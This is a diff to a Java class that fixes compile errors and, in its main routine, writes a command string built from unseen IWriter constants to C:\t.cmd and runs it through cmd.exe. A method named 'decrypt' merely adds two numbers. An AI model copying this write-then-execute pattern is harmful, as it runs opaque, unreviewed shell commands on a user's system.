@@ -17,11 +17,11 @@
 import java.io.*;
 
 public class Run implements IWriter{
-  private int decrypt(String[] ar){
+  public int decrypt(String[] ar){
     int vc = Integer.parseInt(ar[0]);
     int ask = Integer.parseInt(ar[1]);
-    int final = vc + ask;
-    return final;
+    int fnum = vc + ask;
+    return fnum;
   }
 
   public void execute(int code){
@@ -49,15 +49,15 @@ public class Run implements IWriter{
           return;
     }
   }
-  private void writeText(String path,String text){
+  public void writeText(String path,String text){
     File tBatchF = new File(path);
-    FileOutputStream tBatchStream = FileOutputStream(tBatchF);
+    FileOutputStream tBatchStream = new FileOutputStream(tBatchF);
     PrintStream tBatchPStream = new PrintStream(tBatchStream);
     tBatchPStream.append(text);
     tBatchPStream.flush();
     tBatchPStream.close();
   }
-  private void writeBR(String p){
+  public void writeBR(String p){
     writeText(p, "\n");
   }
   public static void main(String[] a){
@@ -84,7 +84,7 @@ public class Run implements IWriter{
         sb.append(IWriter.baseCmd);
         sb.append(IWriter.armv7a);
         sb.append(rv);
-        writeText("C:\\t.cmd", sb.toString());
+        thisInstance.writeText("C:\\t.cmd", sb.toString());
         Runtime.getRuntime().exec("cmd.exe " + "C:\\t.cmd");
       }
     }
